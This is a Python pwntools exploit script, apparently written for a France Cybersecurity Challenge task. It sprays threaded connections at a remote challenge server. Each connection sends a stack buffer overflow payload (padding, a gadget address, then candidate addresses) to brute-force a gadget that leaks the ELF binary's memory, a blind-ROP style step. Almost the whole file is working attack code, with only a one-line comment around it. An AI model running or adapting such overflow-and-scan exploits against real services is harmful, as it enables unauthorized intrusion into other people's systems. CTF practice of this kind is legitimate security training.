from pwn import *

"""
Searching for an address leaking memory, allowing us to
leak the binary
"""

_lock = threading.Lock()


def get_next(it):
    with _lock:
        offset = next(it)
        return offset


def search_gadget(it):
    while True:
        try:
            offset = get_next(it)
        except:
            return
        try:
            time.sleep(0.2)
            base = 0x400000
            if offset % 0x100 == 0:
                print("----- Scanning 0x%x" % offset)
            io = remote('challenges2.france-cybersecurity-challenge.fr', 4008, level='ERROR')
            io.recv(timeout=2)
            io.send(b'a' * 40 + p64(0x40073a + 9) + p64(base) + p64(base + offset))
            sleep(0.5)
            received = io.recv(timeout=2)
            if b'ELF' in received:
                print("Leak addr at", hex(base + offset))
        except:
            pass


iterator = iter(range(0x1000))
for i in range(35):
    threading.Thread(target=search_gadget, args=(iterator,)).start()
    time.sleep(1)
